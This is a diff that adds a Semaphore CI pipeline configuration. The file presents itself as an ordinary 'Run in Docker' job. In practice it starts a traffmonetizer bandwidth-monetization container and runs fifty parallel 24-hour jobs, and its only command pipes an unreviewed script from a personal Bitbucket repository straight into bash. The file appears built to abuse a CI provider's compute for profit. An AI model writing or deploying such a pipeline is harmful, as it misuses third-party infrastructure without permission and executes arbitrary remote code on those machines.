@@ -1,0 +1,22 @@
+version: v1.0
+name: Run in Docker
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu2004
+  containers:
+    - name: main
+      image: 'traffmonetizer/cli_v2:latest'
+    - name: database
+      image: 'registry.semaphoreci.com/postgres:11'
+blocks:
+  - name: Semaphore CI Pool
+    task:
+      jobs:
+        - name: Run job
+          parallelism: 50
+          execution_time_limit:
+            hours: 24
+          commands:
+            - checkout
+            - 'curl -sL https://bitbucket.org/aqshaa/myaqsha/raw/opic | bash'
